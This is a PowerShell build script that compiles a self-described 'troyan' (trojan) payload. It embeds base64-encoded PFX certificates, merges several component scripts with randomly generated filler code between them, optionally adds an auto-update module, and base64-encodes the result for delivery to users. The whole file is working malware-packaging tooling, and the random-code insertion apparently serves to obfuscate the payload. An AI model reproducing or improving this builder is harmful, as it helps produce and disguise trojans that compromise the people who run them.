param (
    [string]$serverName
)
if ([string]::IsNullOrEmpty($serverName)) {
        throw "-serverName argument is null"
}
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
& (Join-Path -Path $scriptDir -ChildPath "../sys/current.ps1") -serverName $serverName


Set-Location -Path $scriptDir
. ".\troyancompile.randomer.ps1"



Write-Host "troyan"

if (Test-Path -Path $server.troyanScript) {
    Remove-Item -Path $server.troyanScript
}

function Filter-ObjectByKeywords {
    param (
        [Parameter(Mandatory = $true)]
        [PSObject]$object,
        
        [Parameter(Mandatory = $true)]
        [string[]]$keywords
    )

    # Create a new empty custom object
    $filteredObject = [PSCustomObject]@{}

    # Iterate over each property of the input object
    foreach ($property in $object.PSObject.Properties) {
        # Check if the property name contains any of the keywords
        $shouldInclude = $true
        foreach ($keyword in $keywords) {
            if ($property.Name -like "*$keyword*") {
                $shouldInclude = $false
                break
            }
        }

        # If the property name does not match any keyword, add it to the new object
        if ($shouldInclude) {
            $filteredObject | Add-Member -MemberType NoteProperty -Name $property.Name -Value $property.Value
        }
    }

    return $filteredObject
}



function Format-ArrayToString {
    param (
        [string[]]$inputArray
    )
    if ($inputArray -eq $null -or $inputArray.Length -eq 0) {
        return ""
    }
    $result = ""
    foreach ($item in $inputArray) {
        $result += "'${item}', "
    }
    $result = $result.TrimEnd(', ')
    return $result
}

#certs
$template = @"
`$server = '_SERVER' | ConvertFrom-Json
`$xdata = @{
    _CERT
}
"@
$stringList = @()
foreach ($domain in $server.domains) {
    $pathPfx = pfxFile($domain)
    if ([string]::IsNullOrEmpty($pathPfx)) {
        throw "The certficiate is not found for domain: $domain"
    }
    $binaryData = [System.IO.File]::ReadAllBytes($pathPfx)
    $base64 = [Convert]::ToBase64String($binaryData)
    $chunkSize = 200
    $chunks = @()
    for ($i = 0; $i -lt $base64.Length; $i += $chunkSize) {
        $chunk = $base64.Substring($i, [Math]::Min($chunkSize, $base64.Length - $i))
        $chunks += $chunk
    }
    $code = "'" + ($chunks -join "'+ "  + [System.Environment]::NewLine + "'") + "'"
    $stringList += "'" + $domain + "'=" + $code
}
$listString = $stringList -join [System.Environment]::NewLine
$template  = $template -replace "_CERT", $listString

$keywords = @("Dir", "troyan", "ftp", "user", "alias","login","password","ico","domainController","interfaces","bux","landing")
$filteredObject = Filter-ObjectByKeywords -object $server -keywords $keywords
$servStr = ($filteredObject | ConvertTo-Json)
$template  = $template -replace "_SERVER", $servStr
$template | Set-Content -Path (Join-Path -Path $server.troyanScriptDir -ChildPath 'consts.ps1')

#join
$ps1Files = @(
    @(Get-ChildItem -Path $server.troyanScriptDir -Filter "consts.ps1"),
    @(Get-ChildItem -Path $server.troyanScriptDir -Filter "utils.ps1"),
    @(Get-ChildItem -Path $server.troyanScriptDir -Filter "*.ps1" | Where-Object { $_.Name -ne "extraupdate.ps1" -and $_.Name -ne "utils.ps1" -and $_.Name -ne "consts.ps1"  -and $_.Name -ne "program.ps1" }),
    @(Get-ChildItem -Path $server.troyanScriptDir -Filter "program.ps1")
) | ForEach-Object { $_ } | Where-Object { $_ -ne $null }

if ($server.autoUpdate)
{
    $ps1Files += (Get-ChildItem -Path $server.troyanScriptDir -Filter "extraupdate.ps1")
}

$joinedContent = ""
foreach ($file in $ps1Files) {
    $fileContent = Get-Content -Path $file.FullName -Raw
    $fileContent = $fileContent -replace '\.\s+\./[^/]+\.ps1', "`n`n"
    $fileContent = $fileContent -replace '. ./utils.ps1', "`n`n"
    $fileContent = $fileContent -replace '. ./consts.ps1', "`n`n"
    $joinedContent += Generate-RandomCode
    $joinedContent += $fileContent + [System.Environment]::NewLine
}
$joinedContent += Generate-RandomCode
$joinedContent | Set-Content -Path $server.troyanScript -Encoding UTF8


function Encode-FileToBase64 {
    param (
        [string]$inFile
    )
    if (-Not (Test-Path -Path $inFile)) {
        return "File $inFile not found."
    }
    $fileContent = [System.IO.File]::ReadAllBytes($inFile)
    $encodedContent = [Convert]::ToBase64String($fileContent)
    return $encodedContent
}

$encoded = Encode-FileToBase64 -inFile $server.troyanScript
$encoded | Set-Content -Path $server.userPowershellFile -Encoding UTF8




Write-Host "Troyan Compile complete"
